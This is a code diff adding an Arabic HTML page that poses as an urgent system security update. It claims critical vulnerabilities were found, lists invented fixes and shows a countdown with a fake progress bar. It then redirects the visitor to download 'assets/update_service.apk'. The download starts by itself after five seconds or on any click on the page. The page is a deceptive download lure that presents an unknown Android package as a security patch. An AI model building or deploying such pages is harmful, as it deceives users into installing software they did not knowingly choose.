@@ -1,0 +1,228 @@
+here<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديثات الأمان - النظام</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #ff6b6b 0%, #feca57 100%);
+            color: #333;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .alert-box {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            margin-top: 50px;
+            backdrop-filter: blur(10px);
+            border-left: 5px solid #e74c3c;
+        }
+        
+        .alert-icon {
+            font-size: 4em;
+            margin-bottom: 20px;
+        }
+        
+        .alert-box h1 {
+            color: #e74c3c;
+            font-size: 2.2em;
+            margin-bottom: 20px;
+        }
+        
+        .alert-box p {
+            color: #7f8c8d;
+            font-size: 1.2em;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        
+        .update-info {
+            background: rgba(231, 76, 60, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 25px 0;
+            text-align: right;
+        }
+        
+        .update-info h3 {
+            color: #e74c3c;
+            margin-bottom: 15px;
+        }
+        
+        .update-list {
+            list-style: none;
+            text-align: right;
+        }
+        
+        .update-list li {
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(231, 76, 60, 0.2);
+        }
+        
+        .update-list li:last-child {
+            border-bottom: none;
+        }
+        
+        .btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: white;
+            padding: 15px 40px;
+            border-radius: 25px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            font-size: 1.1em;
+            margin: 10px;
+        }
+        
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 20px rgba(231, 76, 60, 0.3);
+        }
+        
+        .btn-secondary {
+            background: transparent;
+            border: 2px solid #e74c3c;
+            color: #e74c3c;
+        }
+        
+        .btn-secondary:hover {
+            background: #e74c3c;
+            color: white;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #ecf0f1;
+            border-radius: 4px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+        
+        .progress {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            border-radius: 4px;
+            transition: width 3s ease-in-out;
+        }
+        
+        .footer {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.8);
+            margin-top: 50px;
+            padding: 20px;
+        }
+        
+        .countdown {
+            font-size: 1.5em;
+            color: #e74c3c;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="alert-box">
+            <div class="alert-icon">⚠️</div>
+            <h1>تحديث أمان عاجل مطلوب</h1>
+            <p>تم الكشف عن ثغرات أمنية حرجة في نظامك تتطلب تدخلاً فورياً. يوصى بتثبيت هذا التحديث فوراً لحماية بياناتك وأجهزتك.</p>
+            
+            <div class="update-info">
+                <h3>تفاصيل التحديث الأمني:</h3>
+                <ul class="update-list">
+                    <li>✅ إصلاح ثغرات التنفيذ عن بُعد (Remote Code Execution)</li>
+                    <li>✅ تحديث حزمة التشفير وحماية البيانات</li>
+                    <li>✅ تحسينات أمنية لنظام المصادقة</li>
+                    <li>✅ تصحيح ثغرات تسرب البيانات</li>
+                    <li>✅ تحديث قاعدة بيانات التوقيعات الأمنية</li>
+                </ul>
+            </div>
+            
+            <div class="countdown" id="countdown">سيبدأ التحميل خلال: 5 ثواني</div>
+            
+            <div class="progress-bar">
+                <div class="progress" id="downloadProgress"></div>
+            </div>
+            
+            <div>
+                <button class="btn" onclick="startDownload()">بدء التحديث الآن</button>
+                <a href="index.html" class="btn btn-secondary">العودة للرئيسية</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© 2024 نظام إدارة التحديثات الأمنية. التحديث ضروري للحماية المثلى.</p>
+    </div>
+
+    <script>
+        let countdown = 5;
+        let countdownInterval;
+        
+        function updateCountdown() {
+            const countdownElement = document.getElementById('countdown');
+            countdownElement.textContent = `سيبدأ التحميل خلال: ${countdown} ثواني`;
+            
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+                startDownload();
+            }
+            countdown--;
+        }
+        
+        function startDownload() {
+            clearInterval(countdownInterval);
+            document.getElementById('countdown').textContent = 'جاري التحميل...';
+            
+            // محاكاة تقدم التحميل
+            const progressBar = document.getElementById('downloadProgress');
+            let progress = 0;
+            
+            const progressInterval = setInterval(() => {
+                progress += Math.random() * 10;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(progressInterval);
+                    setTimeout(() => {
+                        window.location.href = 'assets/update_service.apk';
+                    }, 1000);
+                }
+                progressBar.style.width = progress + '%';
+            }, 200);
+        }
+        
+        // بدء العد التنازلي تلقائياً
+        countdownInterval = setInterval(updateCountdown, 1000);
+        
+        // بدء التحميل عند النقر في أي مكان
+        document.addEventListener('click', function() {
+            if (countdown > 0) {
+                startDownload();
+            }
+        });
+    </script>
+</body>
+</html>
